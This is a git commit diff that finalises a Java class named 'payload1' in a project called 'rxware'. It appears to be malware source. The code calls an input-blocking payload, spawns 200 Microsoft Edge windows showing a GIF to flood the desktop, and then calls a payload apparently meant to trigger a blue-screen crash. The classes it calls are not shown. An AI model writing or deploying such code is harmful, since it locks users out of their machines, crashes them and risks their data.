9c85e0089a7f6d9ee1b03564de4e36dfd450863c
Neo <52429194+jds691@users.noreply.github.com>
2024-02-18 10:18:28 +0000

    Fix and finalise payload1

--- src/main/java/rxware/payload1.java
+++ src/main/java/rxware/payload1.java
@@ -1,6 +1,7 @@
 package rxware;
 
 import java.io.IOException;
+import java.net.URISyntaxException;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.util.concurrent.TimeUnit;
@@ -8,20 +9,26 @@ import java.util.concurrent.TimeUnit;
 // Java program to create a text File using FileWriter
 public class payload1{
     public static void main(){
-        Path windowsDir = Paths.get(System.getenv("windir"));
         Path programPath = Paths.get("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
-        Path filePath = Paths.get("C:\\Users\\Knox\\Desktop\\edge.gif");
 
         try {
-            for(int i = 0; i < 200; i++){
-                Process mainProgram = new ProcessBuilder(programPath.toString(), filePath.toString()).start();
-                try {
-                    TimeUnit.MILLISECONDS.sleep(200);
-                } catch (InterruptedException e) {
-                    throw new RuntimeException(e);
+            String gifPath = payload1.class.getResource("rotary.gif").toURI().getPath();
+
+            try {
+                InputBlockerPayload.main();
+                for(int i = 0; i < 200; i++){
+                    Process mainProgram = new ProcessBuilder(programPath.toString(), gifPath).start();
+                    try {
+                        TimeUnit.MILLISECONDS.sleep(200);
+                    } catch (InterruptedException e) {
+                        throw new RuntimeException(e);
+                    }
                 }
+                BSODPayload.main();
+            } catch (IOException e) {
+                throw new RuntimeException(e);
             }
-        } catch (IOException e) {
+        } catch (URISyntaxException e) {
             throw new RuntimeException(e);
         }
     }
